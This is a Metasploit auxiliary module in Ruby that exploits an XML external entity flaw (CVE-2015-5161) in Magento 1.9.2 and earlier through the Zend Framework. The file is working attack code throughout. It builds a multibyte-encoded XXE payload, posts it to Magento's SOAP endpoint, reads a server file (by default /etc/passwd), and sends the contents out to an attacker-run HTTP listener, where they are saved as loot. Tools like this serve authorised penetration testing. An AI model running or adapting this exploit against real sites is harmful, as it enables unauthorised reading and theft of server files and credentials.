##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Magento External Entity Injection',
      'Description'    => %q(
        This module abuses an XML External Entity Injection
        vulnerability in Magento <= 1.9.2. More precisely, the
        vulnerability is in the Zend Framework.

        In short, the Zend Framework XXE vulnerability stems from an insufficient
        sanitisation of untrusted XML data on systems that use PHP-FPM to serve PHP
        applications.
        By using certain multibyte encodings within XML, it is possible to bypass
        the sanitisation and perform certain XXE attacks.

        Since eBay Magento is based on Zend Framework and uses several of its XML
        classes, it also inherits this XXE vulnerability.
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Dawid Golunski', # Vulnerability discovery and original exploit
          'Julien (jvoisin) Voisin' # Metasploit module
        ],
      'References'     =>
        [
          [ 'EDB', '38573' ],
          [ 'CVE', '2015-5161'],
          [ 'BID', '76177'],
          [ 'URL', 'http://legalhackers.com/advisories/eBay-Magento-XXE-Injection-Vulnerability.txt' ],
          [ 'URL', 'http://legalhackers.com/advisories/zend-framework-XXE-vuln.txt' ],
          [ 'URL', 'http://framework.zend.com/security/advisory/ZF2015-06' ]
        ],
      'DisclosureDate' => 'Oct 29 2015'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Magento directory path", '/']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
        OptString.new('URIPATH', [true, "The URI path to use for this exploit to get the data back", "fetch.php"]),
        OptString.new('HTTP_DELAY', [true, "The URI path to use for this exploit to get the data back", 10])
      ], self.class)
  end

  def xml_file
    dtd = Rex::Text.rand_text_alpha(5)
    send = Rex::Text.rand_text_alpha(5)
    file = Rex::Text.rand_text_alpha(5)
    all = Rex::Text.rand_text_alpha(5)

    payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    payload << "<!ENTITY % #{all} \"<!ENTITY &#37; #{send} SYSTEM 'php://filter/read=/resource=http://"
    payload << "#{datastore['SRVHOST']}:#{datastore['SRVPORT']}"
    payload << "/#{datastore['URIPATH']}?#{@param_name}=%#{file};'>\"> %#{all};"

    payload = Rex::Text.encode_base64(payload)

    final_payload = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
    final_payload << "<!DOCTYPE #{Rex::Text.rand_text_alpha(5)} ["
    final_payload << "<!ENTITY % #{file} SYSTEM \"php://filter/convert.base64-encode/resource="
    final_payload << "#{datastore['FILEPATH']}\">"
    final_payload << "<!ENTITY % #{dtd} SYSTEM \"data://text/plain;base64,#{payload}\"> %#{dtd}; %#{send};"
    final_payload << "]>"

    Rex::Text.to_unicode(final_payload)
  end

  def check
    res = send_request_cgi({ 'uri' => target_uri.path })
    return unless res
    return Exploit::CheckCode::Appears if res.body =~ /201[01234] Magento/
    return Exploit::CheckCode::Detected if res.body.include?('Magento')
  end

  def run
    @param_name = Rex::Text.rand_text_alpha(4 + rand(4))
    exploit
  end

  def primer
    res = send_request_raw(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri, 'index.php/api/soap/index'),
      'data' => xml_file
    )

    if res.code != 500
      print_warning "It seems that this instance is not vulnerable"
    end

    service.stop
  end

  def decode_answer(request)
    query_string = request.uri_parts['QueryString']
    param = query_string[@param_name]
    Rex::Text.decode_base64(param)
  end

  def on_request_uri(_cli, request)
    print_status "Got an answer from the server."
    content = decode_answer(request)
    store(content)
  end

  def store(data)
    path = store_loot("magento.file", "text/plain", rhost, data, datastore['FILEPATH'])
    print_good("File #{datastore['FILEPATH']} found and saved to path: #{path}")
  end
end
